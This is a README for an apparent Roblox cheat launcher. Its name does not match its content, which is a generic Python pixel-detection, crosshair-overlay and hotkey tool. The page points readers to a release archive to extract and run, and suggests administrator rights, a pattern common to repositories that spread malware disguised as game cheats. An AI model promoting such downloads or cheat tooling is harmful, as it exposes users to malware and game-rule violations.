# 🎮 roblox-seliware-launcher-x

![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.0-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/ivantaylor-lab1900d8/roblox-seliware-launcher-x?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/ivantaylor-lab1900d8/roblox-seliware-launcher-x?style=flat-square)

Roblox-seliware-launcher — — pixel detection, crosshair overlay, configurable settings

## 📥 Download

[![Download Latest](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](../../releases/latest)

1. Download the latest release from the link above
2. Extract the archive (WinRAR / 7-Zip)
3. Run `python main.py` (or see Usage below)
4. Configure settings in `config.yaml`

## Requirements

Make sure you have Python 3.11+ installed. You'll also need these packages:

```
pip install -r requirements.txt
```

These are the main dependencies:

* `PyYAML`: For config file reading/writing.
* `Pillow`: For image processing.
* `pynput`: For handling keyboard inputs.
* `opencv-python`: For screen analysis.

## Contributing

Pull requests are welcome. Feel free to open issues for bugs or feature requests.

## Running

Run the main script:

```bash
python main.py
```

The application will start, read its settings from `config.yaml`, and begin monitoring your screen. The crosshair will appear based on your config.

## Config

The `config.yaml` file lets you customize how the tool works. Here's an example:

```yaml
overlay:
 crosshair_color: "red"
 crosshair_size: 15
 crosshair_thickness: 2

screen_analysis:
 pixel_x: 100
 pixel_y: 200
 color_threshold: 20

hotkeys:
 tool: "F1"
 exit: "F4"

monitor:
 monitor_number: 0 # Primary monitor
```

* `overlay`: Settings for the crosshair overlay. Color, size, thickness.
* `screen_analysis`: Defines the pixel to monitor and the color threshold.
* `hotkeys`: Customize the hotkeys for tool and exit.
* `monitor`: Select which monitor to use.

## FAQ

<details>
 <summary>Why isn't the crosshair showing up?</summary>
 <br>
 Double-check your `config.yaml` settings. Make sure the overlay is enabled and the crosshair size/thickness are greater than zero. Check your monitor number is correct.
</details>

<details>
 <summary>How do I change the pixel being detected?</summary>
 <br>
 Edit the `pixel_x` and `pixel_y` values in `config.yaml` under the `screen_analysis` section. These are screen coordinates.
</details>

<details>
 <summary>How do I find the color of a pixel on my screen?</summary>
 <br>
Use a color picker tool. Plenty of free ones online. You'll need the RGB values to set the color threshold correctly.
</details>

## Highlights

* **Screen analysis**: Detects color changes at a specified pixel location.
* **Overlay**: Draws a customizable crosshair on the screen.
* **Crosshair**: Choose color, size, and thickness.
* **Pixel detection**: Triggers actions based on pixel color.
* **Hotkey automation**: Start and stop the tool using hotkeys.
* **Configuration**: Configure all settings via a YAML file.

## Troubleshooting

* **Overlay not showing**: Make sure the script has the necessary permissions to draw on the screen. On Windows, you might need to run it as administrator.
* **Pixel detection not working**: Adjust the `color_threshold` in the config file. The closer the detected color is to the target color, the lower the threshold should be.
* **Application crashing on startup**: Check for errors in your `config.yaml` file. YAML is sensitive to indentation. Also, make sure all required packages are installed.

WIP: Add better error handling and logging.

---

⭐ Star this repo if you find it useful!